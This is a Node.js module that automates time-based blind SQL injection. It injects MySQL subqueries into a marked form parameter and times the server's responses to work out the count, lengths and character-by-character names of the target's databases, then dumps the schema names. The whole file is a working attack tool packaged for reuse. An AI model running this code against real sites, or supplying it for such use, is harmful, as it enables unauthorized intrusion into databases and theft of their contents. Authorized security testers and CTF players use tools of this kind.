// const post = (url, param, payload) => {
// 	console.log(payload);
// 	const data = new URLSearchParams();
// 	data.append(param, payload);
// 	return fetch(url, {
// 		method: 'POST',
// 		body: data
// 	});
// };
const util = require('util');

const blindPost = async (url, params) => {
    const timeout = 1;
    const start = new Date();

    const response = await fetch(url, {
        method: 'POST',
        body: params
    });

    const elapsed = new Date() - start;
    const html = await response.text();

    if (html.includes('Wrong.')) {
        throw new Error('SQL error');
    }

    return elapsed > timeout * 1000;
};


class SQLi {
    constructor(options) {
        console.log(options);
        this.url = options.url;
        this.data = options.data;
        this.type = options.type;
        this.query = options.query;
        this.method = options.method;
        this.timeout = options.timeout;
    }

    async getDatabasesCount() {
        const injectable = SQLi.getInjectableParam(this.data);

        const query = this.query.replace(
            'CATPANTS',
            "(SELECT count(DISTINCT(schema_name)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') ORDER BY schema_name)=%i"
        );

        let databasesCount = 0;

        for (let i = 0; i < 100; i += 1) {
            const payload = util.format(query, i, this.timeout);
            const data = new URLSearchParams(this.data);
            const value = data.get(injectable).replace('{CATPANTS}', payload);
            data.set(injectable, value);
            console.log(value);
            const match = await blindPost(this.url, data);

            if (match) {
                databasesCount = i;
                break;
            }
        }

        return databasesCount;
    }

    async getDatabasesList(count) {
        const databaseNames = [];

        for (let i = 0; i < count; i += 1) {
            const databaseName = await this.getDatabaseName(i);
            databaseNames.push(databaseName);
        }

        return databaseNames;
    }

    async getDatabaseName(index) {
        const codes = [...Array(10).keys()].map(i => i + 48)
            .concat([...Array(31).keys()].map(i => i + 95));
        const databaseNameChars = []

        const databaseNameLength = await this.getDatabaseNameLength(index);
        console.log(`Database #${index} name length:`, databaseNameLength);

        for (let i = 1; i <= databaseNameLength; i += 1) {
            for (let code of codes) {
                const injectable = SQLi.getInjectableParam(this.data);

                const query = this.query.replace(
                    'CATPANTS',
                    "ascii(substring((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT %i,1),%i,1))=%i"
                );

                const payload = util.format(query, index, i, code, this.timeout);
                const data = new URLSearchParams(this.data);
                const value = data.get(injectable).replace('{CATPANTS}', payload);
                data.set(injectable, value);
                console.log(value);
                const match = await blindPost(this.url, data);
    
                if (match) {
                    databaseNameChars.push(String.fromCharCode(code));
                    break;
                }
            }
        }

        return databaseNameChars.join('');
    }

    async getDatabaseNameLength(index) {
        const injectable = SQLi.getInjectableParam(this.data);

        const query = this.query.replace(
            'CATPANTS',
            "length((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT %i,1))=%i"
        );

        let databaseNameLength = 0;

        for (let i = 1; i < 100; i += 1) {
            const payload = util.format(query, index, i, this.timeout);
            const data = new URLSearchParams(this.data);
            const value = data.get(injectable).replace('{CATPANTS}', payload);
            data.set(injectable, value);
            console.log(value);
            const match = await blindPost(this.url, data);

            if (match) {
                databaseNameLength = i;
                break;
            }
        }

        return databaseNameLength;
    }

    static getInjectableParam(data) {
        const params = new URLSearchParams(data);
        let injectable = null;

        for (const [key, value] of params.entries()) {
            if (value.includes('{CATPANTS}')) {
                injectable = key;
            }
        }

        if (!injectable) {
            throw new Error('Can\'t find injectable param with value "CATPANTS"')
        }

        return injectable;
    }

    static async dumpDbs(options) {
        const sqli = new SQLi(options);
        const databasesCount = await sqli.getDatabasesCount();

        if (databasesCount === 0) {
            throw new Error('Can\'t get databases count');
        }

        console.log('Databases count: ', databasesCount);
        const databases = await sqli.getDatabasesList(databasesCount);
        console.log(databases);
    }
}

module.exports = SQLi;